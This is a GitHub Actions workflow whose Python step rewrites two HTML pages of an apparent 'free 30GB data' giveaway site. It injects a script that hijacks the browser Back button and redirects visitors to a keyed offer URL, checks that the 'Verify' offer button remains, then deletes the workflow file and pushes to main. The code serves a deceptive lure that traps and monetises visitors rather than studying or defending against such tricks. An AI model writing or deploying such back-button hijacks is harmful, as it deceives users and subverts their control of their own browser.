name: Fix back redirect behavior
on:
  push:
    paths:
      - '.github/workflows/fix-back-redirect.yml'
permissions:
  contents: write
jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: main
          fetch-depth: 0
      - name: Replace legacy hash redirect with back-only handler
        shell: python
        run: |
          import re
          from pathlib import Path

          files = [Path('index.html'), Path('Samu Kyautar 30GB Data A Kowane Layi.html')]
          back_url = 'https://spongeascend.com/tamt7741r?key=51beb06476ba544db62a36db1d10e11b'
          replacement = '''    <script>
        (function () {
            var backRedirectUrl = "''' + back_url + '''";
            if (window.history && window.history.pushState) {
                window.history.pushState({ backRedirectGuard: true }, "", window.location.href);
                window.addEventListener("popstate", function () {
                    window.location.replace(backRedirectUrl);
                }, { once: true });
            }
        })();
    </script>'''

          pattern = re.compile(
              r'\s*<script>\s*window\.onhashchange\s*=\s*function\(\)\s*\{.*?\}\)\(window\);\s*</script>',
              re.S
          )

          outputs = []
          for path in files:
              text = path.read_text(encoding='utf-8')
              new_text, count = pattern.subn('\n' + replacement, text, count=1)
              if count != 1:
                  raise SystemExit(f'Expected one legacy back-navigation block in {path}, found {count}')
              if 'noBackPlease' in new_text or 'global.onhashchange' in new_text or 'window.onhashchange = function()' in new_text:
                  raise SystemExit(f'Legacy auto/hash redirect code still present in {path}')
              if new_text.count('id="offer2"') != 1:
                  raise SystemExit(f'Second Verify button changed unexpectedly in {path}')
              if new_text.count('window.location.replace(backRedirectUrl)') != 1:
                  raise SystemExit(f'Back-only redirect handler verification failed in {path}')
              path.write_text(new_text, encoding='utf-8')
              outputs.append(new_text)

          if outputs[0] != outputs[1]:
              raise SystemExit('HTML entry files are no longer identical')
      - name: Commit fix and remove helper workflow
        run: |
          rm .github/workflows/fix-back-redirect.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add index.html "Samu Kyautar 30GB Data A Kowane Layi.html" .github/workflows/fix-back-redirect.yml
          git commit -m "Fix back redirect to trigger only on Back"
          git push origin main
